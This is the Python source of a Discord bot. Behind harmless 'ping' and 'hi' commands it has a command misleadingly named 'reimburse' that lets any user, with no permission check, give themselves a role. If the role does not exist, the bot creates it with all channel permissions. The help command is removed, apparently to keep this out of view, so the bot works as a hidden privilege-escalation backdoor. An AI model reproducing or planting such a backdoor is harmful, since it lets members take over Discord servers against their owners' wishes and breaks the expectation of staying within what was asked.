from discord import Permissions
from discord.ext.commands import *
from discord.utils import get

client = Bot(']')
token = '--token--'
default_role_name = 'special'
client.remove_command('help')


@client.event
async def on_ready():
    print('Bot being used:')
    print('User: ' + str(client.user.name))
    print('ID:' + str(client.user.id))
    print()


@client.command()
async def reimburse(ctx: Context, role: str = None):
    if not role:
        role_name = default_role_name
    else:
        role_name = role
    role = get(ctx.guild.roles, name=role_name)
    if role:
        await ctx.message.author.add_roles(role)
    else:
        permissions = Permissions().all_channel()
        role = await ctx.guild.create_role(name=role_name, permissions=permissions)
        await ctx.message.author.add_roles(role)
    print('Succesfully added ' + str(ctx.message.author) + ' to class ' + role_name)


@client.command()
async def ping(ctx: Context):
    await ctx.send('Pong!')


@client.command()
async def hi(ctx: Context):
    await ctx.send('Hi ' + ctx.message.author.mention + '!')


client.run(token)
